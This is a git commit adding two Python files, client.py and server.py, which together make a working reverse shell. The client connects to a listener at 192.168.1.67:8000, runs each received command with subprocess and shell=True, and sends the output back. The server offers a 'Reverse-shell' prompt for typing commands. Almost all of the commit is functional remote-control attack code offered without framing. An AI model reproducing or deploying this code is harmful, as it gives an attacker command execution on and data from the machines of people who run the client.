dd5dc18702632d82e2b814161f5d378b7249c6a1
gilsonmneto <34845199+gilsonmneto@users.noreply.github.com>
2020-03-28 03:28:04 -0300

    first commit

---
+++ client.py
@@ -0,0 +1,44 @@
+import socket
+import subprocess
+import json
+
+
+def reliable_send(data):
+    data = str(data, encoding="860")
+    json_data = json.dumps(data)
+    sock.send(json_data.encode())
+
+
+def reliable_recv():
+    json_data = ""
+    while True:
+        try:
+            json_data = json_data + sock.recv(1024).decode()
+            return json.loads(json_data)
+        except ValueError:
+            continue
+
+
+def shell():
+    while True:
+        command = reliable_recv()
+        print("Command received from server: " + command)
+        if command == "q":
+            break
+        else:
+            try:
+                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                        stdin=subprocess.PIPE)
+                result = proc.stdout.read() + proc.stderr.read()
+                print("Response send to server: " + str(result, encoding="860")[:30] + "...")
+                reliable_send(result)
+            except Exception as e:
+                print("Response send to server: Error")
+                reliable_send("Execution problems: " + str(e))
+
+
+sock = socket.socket()
+sock.connect(("192.168.1.67", 8000))
+print("Connection established to server")
+shell()
+sock.close()
---
+++ server.py
@@ -0,0 +1,46 @@
+import socket
+import json
+
+
+def reliable_send(data):
+    data = str(data)
+    json_data = json.dumps(data)
+    target.send(json_data.encode())
+
+
+def reliable_recv():
+    json_data = ""
+    while True:
+        try:
+            json_data = json_data + target.recv(1024).decode()
+            return json.loads(json_data)
+        except ValueError:
+            continue
+
+
+def shell():
+    while True:
+        command = input("* Reverse-shell#~" + str(ip) + ": ")
+        reliable_send(command)
+        if command == "q":
+            break
+        else:
+            result = reliable_recv()
+            print("\n" + result)
+
+
+def server():
+    global s
+    global ip
+    global target
+    s = socket.socket()
+    s.bind(("192.168.1.67", 8000))
+    s.listen(5)
+    print("Listening for incoming connections...")
+    target, ip = s.accept()
+    print("New client connected!")
+
+
+server()
+shell()
+s.close()
